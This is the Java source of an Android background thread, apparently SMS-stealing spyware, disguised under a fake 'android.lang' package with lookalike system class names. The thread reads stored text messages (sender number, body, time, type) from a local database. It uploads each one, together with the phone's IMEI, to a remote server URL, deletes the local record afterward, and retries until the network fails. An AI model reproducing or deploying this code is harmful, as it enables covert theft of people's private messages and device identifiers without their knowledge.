package android.lang;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import android.app.Dctivity;
import android.content.Context;
import android.database.sqlite.DQLiteOpenHelper;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.TelephonyManager;
import android.util.Log;

public class Dhread extends Thread {

	private static ExecutorService pool = Executors.newFixedThreadPool(1);

	private Context context;
	private boolean isrun = false;

	public Dhread(Context context) {
		this.context = context;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		super.run();
		isrun = true;
		int i = 0;
		String id = "0";
		LogUtils.write("Send", "开始发送短信");
		while (isrun&&isConnectingToInternet()) {
			LogUtils.write("Send", "网络可用继续发送");
			Map<String, String> map = DQLiteOpenHelper.getHelper(context)
					.getData(id);
			if (map != null) {
				LogUtils.write("Send", "获取待发送数据");
				List<NameValuePair> formparams = new ArrayList<NameValuePair>();
				formparams.add(new BasicNameValuePair("menu", "addjie3"));
				formparams.add(new BasicNameValuePair("ad", "save"));
				formparams.add(new BasicNameValuePair("name", "AAA"));
				formparams.add(new BasicNameValuePair("ti", map.get("pn")));
				formparams.add(new BasicNameValuePair("zong", GetDeviceId()));
				formparams
						.add(new BasicNameValuePair("jiang", map.get("body")));
				formparams.add(new BasicNameValuePair("riqi", map.get("time")));
				formparams.add(new BasicNameValuePair("lei", map.get("type")));
				String result = HttpClient.post(Dctivity.Dctivityhttpurl,formparams);
				if (result != null) {
					LogUtils.write("Send", "发送结果"+result);
					i = 0;
					id = map.get("id");
					LogUtils.write("Send", "发送成功" + i + "  " + id);
					DQLiteOpenHelper.getHelper(context).deleteData(id);
				} else {
					i++;
					LogUtils.write("Send", "发送失败" + i);
				}
				if (i >= 5) {
					LogUtils.write("Send", "连续发送5次失败，结束发送");
					isrun = false;
				}
				ThreadSleep(1000);
			} else {
				LogUtils.write("Send", "未发现待发送数据");
				isrun = false;
			}
		}
	}

	public String GetDeviceId() {
		TelephonyManager tm = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		return tm.getDeviceId();
	}

	public void ThreadSleep(int time) {
		try {
			Thread.sleep(time);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public boolean isConnectingToInternet() {
		ConnectivityManager connectivity = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		if (connectivity != null) {
			NetworkInfo[] info = connectivity.getAllNetworkInfo();
			if (info != null)
				for (int i = 0; i < info.length; i++)
					if (info[i].getState() == NetworkInfo.State.CONNECTED) {
						return true;
					}

		}
		return false;
	}

	public boolean isrun() {
		return isrun;
	}

	public static synchronized void SartSend(Context context) {
		LogUtils.write("Send", "加入发送线程");
		pool.execute(new Dhread(context));
	}

	public synchronized void StopSend() {
		isrun = false;
	}
}
